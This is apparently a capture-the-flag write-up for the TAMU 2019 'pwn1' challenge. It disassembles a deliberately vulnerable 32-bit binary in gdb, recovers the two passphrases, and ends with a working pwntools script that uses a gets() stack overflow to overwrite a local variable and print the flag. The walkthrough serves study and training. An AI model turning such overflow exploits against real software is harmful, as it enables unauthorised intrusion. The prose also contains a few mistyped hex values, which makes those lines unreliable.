# Tamu19 pwn1

## Overview

When you first run the binray a message displays:

```
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
```

After entering some characters (I entered "root") we see the response:

```
root
I don't know that! Auuuuuuuugh!
```

When checking the security of the binary we see the following:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable$ pwn checksec pwn1
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/Variable/pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

This shows the binary is 32bit complied with PIE, NX, and RELRO protections, but no stack canary. We'll take a look at it in gdb since the binary is not stripped.

## Reversing

```bash
gef➤  disass main
Dump of assembler code for function main:
   0x56555779 <+0>:    lea    ecx,[esp+0x4]
   0x5655577d <+4>:    and    esp,0xfffffff0
   0x56555780 <+7>:    push   DWORD PTR [ecx-0x4]
   0x56555783 <+10>:    push   ebp
   0x56555784 <+11>:    mov    ebp,esp
   0x56555786 <+13>:    push   ebx
   0x56555787 <+14>:    push   ecx
   0x56555788 <+15>:    sub    esp,0x40
   0x5655578b <+18>:    call   0x56555600 <__x86.get_pc_thunk.bx>
   0x56555790 <+23>:    add    ebx,0x1820
   0x56555796 <+29>:    mov    eax,DWORD PTR [ebx+0x44]
   0x5655579c <+35>:    mov    eax,DWORD PTR [eax]
   0x5655579e <+37>:    push   0x0
   0x565557a0 <+39>:    push   0x0
   0x565557a2 <+41>:    push   0x2
   0x565557a4 <+43>:    push   eax
   0x565557a5 <+44>:    call   0x56555580 <setvbuf@plt>
   0x565557aa <+49>:    add    esp,0x10
   0x565557ad <+52>:    mov    DWORD PTR [ebp-0xc],0x2
   0x565557b4 <+59>:    mov    DWORD PTR [ebp-0x10],0x0
   0x565557bb <+66>:    sub    esp,0xc
   0x565557be <+69>:    lea    eax,[ebx-0x1620]
   0x565557c4 <+75>:    push   eax
   0x565557c5 <+76>:    call   0x56555550 <puts@plt>
   0x565557ca <+81>:    add    esp,0x10
   0x565557cd <+84>:    sub    esp,0xc
   0x565557d0 <+87>:    lea    eax,[ebx-0x15b5]
   0x565557d6 <+93>:    push   eax
   0x565557d7 <+94>:    call   0x56555550 <puts@plt>
   0x565557dc <+99>:    add    esp,0x10
   0x565557df <+102>:    mov    eax,DWORD PTR [ebx+0x40]
   0x565557e5 <+108>:    mov    eax,DWORD PTR [eax]
   0x565557e7 <+110>:    sub    esp,0x4
   0x565557ea <+113>:    push   eax
   0x565557eb <+114>:    push   0x2b
   0x565557ed <+116>:    lea    eax,[ebp-0x3b]
   0x565557f0 <+119>:    push   eax
   0x565557f1 <+120>:    call   0x56555530 <fgets@plt>
   0x565557f6 <+125>:    add    esp,0x10
   0x565557f9 <+128>:    sub    esp,0x8
   0x565557fc <+131>:    lea    eax,[ebx-0x159f]
   0x56555802 <+137>:    push   eax
   0x56555803 <+138>:    lea    eax,[ebp-0x3b]
   0x56555806 <+141>:    push   eax
   0x56555807 <+142>:    call   0x56555510 <strcmp@plt>
   0x5655580c <+147>:    add    esp,0x10
   0x5655580f <+150>:    test   eax,eax
   0x56555811 <+152>:    je     0x5655582f <main+182>
   0x56555813 <+154>:    sub    esp,0xc
   0x56555816 <+157>:    lea    eax,[ebx-0x1584]
   0x5655581c <+163>:    push   eax
   0x5655581d <+164>:    call   0x56555550 <puts@plt>
   0x56555822 <+169>:    add    esp,0x10
   0x56555825 <+172>:    sub    esp,0xc
   0x56555828 <+175>:    push   0x0
   0x5655582a <+177>:    call   0x56555560 <exit@plt>
   0x5655582f <+182>:    sub    esp,0xc
   0x56555832 <+185>:    lea    eax,[ebx-0x1564]
   0x56555838 <+191>:    push   eax
   0x56555839 <+192>:    call   0x56555550 <puts@plt>
   0x5655583e <+197>:    add    esp,0x10
   0x56555841 <+200>:    mov    eax,DWORD PTR [ebx+0x40]
   0x56555847 <+206>:    mov    eax,DWORD PTR [eax]
   0x56555849 <+208>:    sub    esp,0x4
   0x5655584c <+211>:    push   eax
   0x5655584d <+212>:    push   0x2b
   0x5655584f <+214>:    lea    eax,[ebp-0x3b]
   0x56555852 <+217>:    push   eax
   0x56555853 <+218>:    call   0x56555530 <fgets@plt>
   0x56555858 <+223>:    add    esp,0x10
   0x5655585b <+226>:    sub    esp,0x8
   0x5655585e <+229>:    lea    eax,[ebx-0x154d]
   0x56555864 <+235>:    push   eax
   0x56555865 <+236>:    lea    eax,[ebp-0x3b]
   0x56555868 <+239>:    push   eax
   0x56555869 <+240>:    call   0x56555510 <strcmp@plt>
   0x5655586e <+245>:    add    esp,0x10
   0x56555871 <+248>:    test   eax,eax
   0x56555873 <+250>:    je     0x56555891 <main+280>
   0x56555875 <+252>:    sub    esp,0xc
   0x56555878 <+255>:    lea    eax,[ebx-0x1584]
   0x5655587e <+261>:    push   eax
   0x5655587f <+262>:    call   0x56555550 <puts@plt>
   0x56555884 <+267>:    add    esp,0x10
   0x56555887 <+270>:    sub    esp,0xc
   0x5655588a <+273>:    push   0x0
   0x5655588c <+275>:    call   0x56555560 <exit@plt>
   0x56555891 <+280>:    sub    esp,0xc
   0x56555894 <+283>:    lea    eax,[ebx-0x1534]
   0x5655589a <+289>:    push   eax
   0x5655589b <+290>:    call   0x56555550 <puts@plt>
   0x565558a0 <+295>:    add    esp,0x10
   0x565558a3 <+298>:    sub    esp,0xc
   0x565558a6 <+301>:    lea    eax,[ebp-0x3b]
   0x565558a9 <+304>:    push   eax
   0x565558aa <+305>:    call   0x56555520 <gets@plt>
   0x565558af <+310>:    add    esp,0x10
   0x565558b2 <+313>:    cmp    DWORD PTR [ebp-0x10],0xdea110c8
   0x565558b9 <+320>:    jne    0x565558c2 <main+329>
   0x565558bb <+322>:    call   0x565556fd <print_flag>
   0x565558c0 <+327>:    jmp    0x565558d4 <main+347>
   0x565558c2 <+329>:    sub    esp,0xc
   0x565558c5 <+332>:    lea    eax,[ebx-0x1584]
   0x565558cb <+338>:    push   eax
   0x565558cc <+339>:    call   0x56555550 <puts@plt>
   0x565558d1 <+344>:    add    esp,0x10
   0x565558d4 <+347>:    mov    eax,0x0
   0x565558d9 <+352>:    lea    esp,[ebp-0x8]
   0x565558dc <+355>:    pop    ecx
   0x565558dd <+356>:    pop    ebx
   0x565558de <+357>:    pop    ebp
   0x565558df <+358>:    lea    esp,[ecx-0x4]
   0x565558e2 <+361>:    ret    
End of assembler dump.
```

This is quite a large disassembly, but the key things to note are: 

1. At main<+76> and main<+94> there is a call to the `puts` function.
2. Short after this main<+120> calls the `fgets` function and compares values to pushed to the stack from ebp-0x3b and ebx-0x159f. If the comparison is not equal then the program exits (the zero flag should be set if equal).
3. At main<+218> there is another call to `fgets` followed by another a call to `strcmp` between ebp-0x3b and ebx-0x154d. Again if the comparison is not equal the program exits.
4. If the last compare was correct a jump is made to main<+280> where further data at ebx-0x1534 is pushed to the stack with a call to `puts` at main<+290>.
5. Next, the `gets` function is called at main<+305> followed by a call to `strcmp` for with the values ebp-0x10 and 0xdea110c8.
6. If the last comparison was correct the function `print_flag` is call, otherwise a call is made to puts and the program exits.

So from this we can already see some values we need to inspect further, i.e. the values that are being passed into strcmp. Additionally, the first two calls for user input are made using fgets, so these are not vulnerable to an overflow condition since fgets requires a size to be defined when calling the function. At this point we can break on main and step through the program to find the values or check what ghidra can see when disassembling the binary.

### GDB

Placing a breakpoint on main, and stepping through the calls until we get to `fgets`, we see the message "What is your name?" followed by a newline with a prompt waiting for our input. If we write "test" and then hit enter (and type "next" a few times in the prompt to skip the kernel calls to read our input) we can see the following:

```bash
$eax   : 0xffffd11d  →  "test\n"
$ebx   : 0x56556fb0  →  <_GLOBAL_OFFSET_TABLE_+0000> mov eax, 0x1e
$ecx   : 0x565581a5  →  0x00000000
$edx   : 0xf7fa29c0  →  0x00000000
$esp   : 0xffffd100  →  0xffffd11d  →  "test\n"
$ebp   : 0xffffd158  →  0xf7ffd020  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
$esi   : 0xffffd224  →  0xffffd3d8  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565557f6  →  <main+007d> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd100│+0x0000: 0xffffd11d  →  "test\n"     ← $esp
0xffffd104│+0x0004: 0x0000002b ("+"?)
0xffffd108│+0x0008: 0xf7fa1620  →  0xfbad2288
0xffffd10c│+0x000c: 0x00000000
0xffffd110│+0x0010: 0x00000000
0xffffd114│+0x0014: 0x00000000
0xffffd118│+0x0018: 0x01000000
0xffffd11c│+0x001c: "\ttest\n"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565557ed <main+0074>      lea    eax, [ebp-0x3b]
   0x565557f0 <main+0077>      push   eax
   0x565557f1 <main+0078>      call   0x56555530 <fgets@plt>
 → 0x565557f6 <main+007d>      add    esp, 0x10
   0x565557f9 <main+0080>      sub    esp, 0x8
   0x565557fc <main+0083>      lea    eax, [ebx-0x159f]
   0x56555802 <main+0089>      push   eax
   0x56555803 <main+008a>      lea    eax, [ebp-0x3b]
   0x56555806 <main+008d>      push   eax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn1", stopped 0x565557f6 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565557f6 → main()
```

Looking at this output we can see that we have just finished the call to fgets and returned to main. The next important instructions before the call to strcmp are `lea  eax, [ebx-0x159f]` and `lea  eax, [ebp-0x3b]`. We can check these values by examining the memory. First we look at ebx-0x159f:

```bash
gef➤  x/s $ebx-0x159f
0x56555a11:    "Sir Lancelot of Camelot\n"
```

Interesting, this is different from our test value so we know this is likely what it is being compared against. To check if ebp-0x3b holds our test value we can examine the memory there:

```bash
gef➤  x/s $ebp-0x3b
0xffffd11d:    "test\n"
```

So now we have confirmed where our input is being stored and what the first response should be. We can use this technique to get to the second question in the program and find the value at ebx-0x154d:

```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x56555a63  →  "To seek the Holy Grail.\n"
$ebx   : 0x56556fb0  →  <_GLOBAL_OFFSET_TABLE_+0000> mov eax, 0x1e
$ecx   : 0xffffd11d  →  0x2072000a ("\n"?)
$edx   : 0xf7fa29c0  →  0x00000000
$esp   : 0xffffd108  →  0xf7fa1620  →  0xfbad2288
$ebp   : 0xffffd158  →  0xf7ffd020  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
$esi   : 0xffffd224  →  0xffffd3d8  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x56555864  →  <main+00eb> push eax
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd108│+0x0000: 0xf7fa1620  →  0xfbad2288     ← $esp
0xffffd10c│+0x0004: 0x00000000
0xffffd110│+0x0008: 0x00000000
0xffffd114│+0x000c: 0x00000000
0xffffd118│+0x0010: 0x01000000
0xffffd11c│+0x0014: "\t\n"
0xffffd120│+0x0018: " Lancelot of Camelot\n"
0xffffd124│+0x001c: "celot of Camelot\n"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x56555858 <main+00df>      add    esp, 0x10
   0x5655585b <main+00e2>      sub    esp, 0x8
   0x5655585e <main+00e5>      lea    eax, [ebx-0x154d]
 → 0x56555864 <main+00eb>      push   eax
   0x56555865 <main+00ec>      lea    eax, [ebp-0x3b]
   0x56555868 <main+00ef>      push   eax
   0x56555869 <main+00f0>      call   0x56555510 <strcmp@plt>
   0x5655586e <main+00f5>      add    esp, 0x10
   0x56555871 <main+00f8>      test   eax, eax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn1", stopped 0x56555864 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56555864 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $ebx-0x154d
0x56555a63:    "To seek the Holy Grail.\n"
```

Now we have the answer to the second question, we can test this out by running the program:

```bash
gef➤  next
Single stepping until exit from function main,
which has no line number information.
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
```

We have successfully got to the third question which by deduction will be the prompt for our input where `gets` is called. Remembering gets allows input to be read past whatever the orginal buffer size was set to, this is likely where we can overflow our input to the stack. If we press `control + c` at this point to break the execution (and next to skip the kernel calls), we can examine the memory of the stack at this point:

```bash
$eax   : 0xffffd11d  →  "test"
$ebx   : 0x56556fb0  →  <_GLOBAL_OFFSET_TABLE_+0000> mov eax, 0x1e
$ecx   : 0xf7fa29c0  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffd110  →  0x00000000
$ebp   : 0xffffd158  →  0xf7ffd020  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
$esi   : 0xffffd224  →  0xffffd3d8  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565558b2  →  <main+0139> cmp DWORD PTR [ebp-0x10], 0xdea110c8
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd110│+0x0000: 0x00000000     ← $esp
0xffffd114│+0x0004: 0x00000000
0xffffd118│+0x0008: 0x01000000
0xffffd11c│+0x000c: "\ttest"
0xffffd120│+0x0010: 0x6b650074 ("t"?)
0xffffd124│+0x0014: " the Holy Grail.\n"
0xffffd128│+0x0018: " Holy Grail.\n"
0xffffd12c│+0x001c: "y Grail.\n"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565558a9 <main+0130>      push   eax
   0x565558aa <main+0131>      call   0x56555520 <gets@plt>
   0x565558af <main+0136>      add    esp, 0x10
 → 0x565558b2 <main+0139>      cmp    DWORD PTR [ebp-0x10], 0xdea110c8
   0x565558b9 <main+0140>      jne    0x565558c2 <main+329>
   0x565558bb <main+0142>      call   0x565556fd <print_flag>
   0x565558c0 <main+0147>      jmp    0x565558d4 <main+347>
   0x565558c2 <main+0149>      sub    esp, 0xc
   0x565558c5 <main+014c>      lea    eax, [ebx-0x1584]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn1", stopped 0x565558b2 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565558b2 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/64w $esp
0xffffd110:    0x0    0x0    0x1000000    0x73657409
0xffffd120:    0x6b650074    0x65687420    0x6c6f4820    0x72472079
0xffffd130:    0x2e6c6961    0xf7fd000a    0xf7d934be    0xf7fbe4a0
0xffffd140:    0xffffd180    0xf7fbe66c    0x0    0x2
0xffffd150:    0xffffd170    0xf7fa1000    0xf7ffd020    0xf7d9c519
0xffffd160:    0xffffd3d8    0x70    0xf7ffd000    0xf7d9c519
0xffffd170:    0x1    0xffffd224    0xffffd22c    0xffffd190
0xffffd180:    0xf7fa1000    0x56555779 <main>    0x1    0xffffd224
0xffffd190:    0xf7fa1000    0xffffd224    0xf7ffcb80    0xf7ffd020
0xffffd1a0:    0xfe406556    0xb26b2f46    0x0    0x0
0xffffd1b0:    0x0    0xf7ffcb80    0xf7ffd020    0xb9bd5200
0xffffd1c0:    0xf7ffda40    0xf7d9c4a6    0xf7fa1000    0xf7d9c5f3
0xffffd1d0:    0x0    0x0    0x0    0x0
0xffffd1e0:    0x0    0x0    0xf7d9c56d    0x56556fb0
0xffffd1f0:    0x1    0x565555c0 <_start>    0x0    0x565555f1 <_start+49>
0xffffd200:    0x56555779 <main>    0x1    0xffffd224    0x565558f0 <__libc_csu_init>
```

Looking at the stack we see our input to the last question "What is my secret?", and our response "test" at 0xffffd11c. We also see ebp is set to 0xffffd158, so ebp-0x10 would be 0xffffd148. 0xffffd148 is stack address of the variable that will be compared with 0xdea11c8, and they must be equal to call `print_flag`. Further up in the disassembly we saw ebp-0x10 was set to zero:

```bash
0x565557b4 <+59>:    mov    DWORD PTR [ebp-0x10],0x00x565557b4 <+59>:    mov    DWORD PTR [ebp-0x10],0x0
```

When we check the stack we see that it has remained at zero: 

```bash
0xffffd140: 0xffffd180  0xf7fbe66c `0x0` 0x2
```

Since it is still zero we will need to modify the value to successfully pass the `cmp` check. To do this, we'll need to break out of the buffer and write the value 0xdea11c8 to 0xffffd148 (ebp-0x10). Given the buffer for our input starts at 0xffff11c, we need to calculate how bytes need to be written to reach 0xffffd148. We can calculate it by doing 0xffffd148 - 0xffffd11c or (0x48 - 0x11c) to shorten it. Using python we see that the difference is 2b (we minus 0x01 because we only want the difference upto not including 0xffffd148): 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable$ python3 -c "print(hex(0x48 - 0x1c -0x1))"
0x2b
```

Now we know we need to send 0x2b bytes (43) to reach the variable ebp-0x10. To send the exploit, we use pwn tools to send 43 A's and then append this with 0xdea11c8. Since we're using python3, we'll need to specify byte strings rather than the default which is unicode strings:

### Exploit

```python
from pwn import * 

target = process("./pwn1")

payload = b"A" * 43
payload += p32(0xdea110c8)
print(payload)


#gdb.attach(target, gdbscript='b *main')

print(target.recvuntil(b"see."))

target.sendline(b"Sir Lancelot of Camelot")

print(target.recvuntil(b"quest?"))

target.sendline(b"To seek the Holy Grail.")

print(target.recvuntil(b"secret?"))

target.sendline(payload)

target.interactive()
```

Running this script against the target we see the following:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable$ python3 exploit_pwn1.py 
[+] Starting local process './pwn1': pid 14129
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc8\x10\xa1\xde'
b'Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.'
b'\nWhat... is your name?\nWhat... is your quest?'
b'\nWhat... is my secret?'
[*] Switching to interactive mode

[*] Process './pwn1' stopped with exit code 0 (pid 14129)
Right. Off you go.
flag{g0ttem_b0yz}

[*] Got EOF while reading in interactive
$  
```
